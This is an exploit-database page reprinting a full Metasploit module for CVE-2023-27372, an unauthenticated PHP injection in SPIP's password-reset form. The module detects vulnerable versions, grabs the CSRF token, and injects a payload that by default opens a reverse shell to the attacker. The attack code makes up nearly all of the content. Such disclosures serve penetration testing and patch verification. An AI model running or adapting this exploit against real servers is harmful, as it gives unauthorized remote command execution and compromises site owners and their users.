---
title: SPIP Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2023040062
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-19
fetch_date: 2025-10-04T11:31:52.454994
---

# SPIP Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SPIP Remote Command Execution** **2023.04.18**  Credit:  **[coiffeur](https://cxsecurity.com/author/coiffeur/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::CmdStager
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'SPIP form PHP Injection',
'Description' => %q{
This module exploits a PHP code injection in SPIP. The vulnerability exists in the
oubli parameter and allows an unauthenticated user to execute arbitrary commands
with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions
are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.
},
'Author' => [
'coiffeur', # Initial discovery
'Laluka', # PoC
'Julien Voisin' # MSF module
],
'License' => MSF\_LICENSE,
'References' => [
[ 'URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html' ],
[ 'URL', 'https://therealcoiffeur.com/c11010' ],
[ 'CVE', '2023-27372' ],
],
'Privileged' => false,
'Platform' => %w[php linux unix],
'Arch' => [ARCH\_PHP, ARCH\_CMD],
'Targets' => [
[
'Automatic (PHP In-Memory)',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP,
'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse\_tcp' },
'Type' => :php\_memory,
'Payload' => {
'BadChars' => "\x22\x00"
}
}
],
[
'Automatic (Unix In-Memory)',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },
'Type' => :unix\_memory,
'Payload' => {
'BadChars' => "\x22\x00\x27"
}
}
],
],
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'Reliability' => [ REPEATABLE\_SESSION ],
'SideEffects' => [IOC\_IN\_LOGS]
},
'DefaultTarget' => 0,
'DisclosureDate' => '2023-02-27'
)
)
register\_options(
[
OptString.new('TARGETURI', [true, 'The base path to SPIP application', '/']),
]
)
end
def check
uri = normalize\_uri(target\_uri.path, 'spip.php')
res = send\_request\_cgi({ 'uri' => uri.to\_s })
return Exploit::CheckCode::Unknown('Target is unreachable.') unless res
return Exploit::CheckCode::Unknown("Target responded with unexpected HTTP response code: #{res.code}") unless res.code == 200
version\_string = res.get\_html\_document.at('head/meta[@name="generator"]/@content')&.text
return Exploit::CheckCode::Unknown('Unable to find the version string on the page: spip.php') unless version\_string =~ /SPIP (.\*)/
version = ::Regexp.last\_match(1)
if version.nil? && res.headers['Composed-By'] =~ /SPIP (.\*) @/
version = ::Regexp.last\_match(1)
end
return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless version
print\_status("SPIP Version detected: #{version}")
rversion = Rex::Version.new(version)
if rversion >= Rex::Version.new('4.2.0')
if rversion < Rex::Version.new('4.2.1')
return Exploit::CheckCode::Appears
end
elsif rversion >= Rex::Version.new('4.1.0')
if rversion < Rex::Version.new('4.1.18')
return Exploit::CheckCode::Appears
end
elsif rversion >= Rex::Version.new('4.0.0')
if rversion < Rex::Version.new('4.0.10')
return Exploit::CheckCode::Appears
end
elsif rversion >= Rex::Version.new('3.2.0')
if rversion < Rex::Version.new('3.2.18')
return Exploit::CheckCode::Appears
end
end
return Exploit::CheckCode::Safe
end
def execute\_command(cmd, args = {})
send\_request\_cgi(
{
'uri' => args['uri'],
'method' => 'POST',
'vars\_post' => {
'page' => 'spip\_pass',
'lang' => 'fr',
'formulaire\_action' => 'oubli',
'formulaire\_action\_args' => args['csrf'],
'oubli' => cmd
}
}
)
end
def exploit
uri = normalize\_uri(target\_uri.path, 'spip.php?page=spip\_pass&lang=fr')
res = send\_request\_cgi({ 'uri' => uri })
fail\_with(Msf::Exploit::Failure::Unreachable, "The request to uri: #{uri} did not respond") unless res
fail\_with(Msf::Exploit::Failure::UnexpectedReply, "Got an http code that isn't 200: #{res.code}, when sending a request to uri: #{uri}") unless res&.code == 200
csrf = ''
unless (node = res.get\_html\_document.xpath('//form//input[@name="formulaire\_action\_args"]')).empty?
csrf = node.first['value']
end
print\_status("Got anti-csrf token: #{csrf}")
print\_status("#{rhost}:#{rport} - Attempting to exploit...")
oubli = ''
case target['Type']
when :php\_memory
oubli = "s:#{payload.encoded.length + 6 + 2}:\"<?php #{payload.encoded}?>\";"
when :unix\_memory
oubli = "s:#{payload.encoded.length + 14 + 4}:\"<?php system('#{payload.encoded}')?>\";"
end
execute\_command(oubli, { 'uri' => uri, 'csrf' => csrf })
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040062)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top